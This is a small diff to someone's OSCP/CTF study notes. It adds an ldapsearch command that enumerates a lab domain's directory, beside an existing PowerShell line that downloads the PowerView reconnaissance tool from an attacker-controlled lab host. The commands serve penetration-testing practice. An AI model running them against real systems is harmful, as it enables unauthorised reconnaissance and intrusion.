@@ -2,6 +2,12 @@
 
 # OSCP / CTF
 
+get ldap with description and info attributes
+```
+ldapsearch -H ldap://10.10.10.169:3268 -x -LLL -s sub -b "DC=megabank,DC=local"
+```
+
+
 ```
 Invoke-WebRequest -Uri "http://10.10.14.61:8000/PowerView.ps1" -OutFile "$env:temp\PowerView.ps1"
 ```
